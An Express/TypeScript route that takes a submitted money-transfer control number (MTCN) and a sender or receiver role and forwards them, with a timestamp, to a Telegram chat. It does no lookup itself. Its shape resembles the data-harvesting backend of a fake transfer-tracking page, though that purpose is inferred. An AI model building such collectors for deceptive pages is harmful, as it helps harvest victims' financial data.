import { Router } from "express";

const router = Router();

router.post("/notify", async (req, res) => {
  const { mtcn, role } = req.body as { mtcn?: string; role?: string };

  if (!mtcn || mtcn.length !== 10) {
    res.status(400).json({ error: "Invalid MTCN" });
    return;
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    req.log.error("Telegram env vars not set");
    res.status(500).json({ error: "Telegram not configured" });
    return;
  }

  const now = new Date().toLocaleString("en-US", { timeZone: "UTC" });
  const roleLabel = role === "receiver" ? "Receiver" : "Sender";

  const message =
    `🔔 *New Transfer Lookup*\n\n` +
    `📋 *MTCN:* \`${mtcn}\`\n` +
    `👤 *Role:* ${roleLabel}\n` +
    `🕐 *Time (UTC):* ${now}`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );

    if (!response.ok) {
      const err = await response.text();
      req.log.error({ err }, "Telegram API error");
      res.status(502).json({ error: "Failed to send Telegram message" });
      return;
    }

    res.json({ ok: true });
  } catch (err) {
    req.log.error({ err }, "Telegram fetch failed");
    res.status(500).json({ error: "Internal error" });
  }
});

export default router;
